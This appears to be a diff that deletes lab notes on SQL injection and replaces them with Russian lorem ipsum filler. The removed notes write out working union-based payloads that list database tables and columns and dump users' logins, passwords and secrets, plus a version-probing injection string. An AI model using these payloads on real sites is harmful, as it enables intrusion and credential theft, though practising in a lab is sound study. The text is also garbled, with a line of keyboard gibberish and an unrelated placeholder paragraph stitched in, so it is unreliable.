@@ -1,27 +1,2 @@
-SQL Injection (GET/Search)
-1) Select in list “SQL Injection (GET/Search)”
-
-2) Find out if SQL injection attack can be done on this site
-
-3) Using SQL injection find tables on database
-
-4) Find column names from user table
-
-5) Show information about users
-
-
-3) m' union all select 1,table_name,3,4,5,6,7 from
-information_schema.tables where table_schema=database()
--- -
-
-4) m' union all select 1,column_name,3,4,5,6,7 from
-information_schema.columns where table_name='users' and
-table_schema=database() -- -
-
-5) m' union all select 1,login,password,secret,5,6,7 from
-users -- -0
-
-
-2.  test’ or substring(@@version,1,1)=4#
-Ashjdb has baslı absh,bd ajsdbf absdjlkfhab ds fkjladhsbf dm,bafhjsmn dfkjahsdnfjk ads nbfjkdsnfbajksdhfbja,djksfbsad fjasdjkb
-
+Brand asDarynЧто такое Лорем Ипсум?
+Lorem Ipsum — это просто текст-пустышка полиграфической и наборной индустрии. Lorem Ipsum был стандартным фиктивным текстом в отрасли с 1500-х годов, когда неизвестный печатник взял гранку шрифта и перемешал ее, чтобы сделать книгу образцов шрифтов. Он пережил не только пять столетий, но и скачок в электронный набор текста, оставаясь практически неизменным. Он был популяризирован в 1960-х годах с выпуском листов Letraset, содержащих отрывки Lorem Ipsum, а совсем недавно - с программным обеспечением для настольных издательских систем, таким как Aldus PageMaker, включая версии Lorem Ipsum.
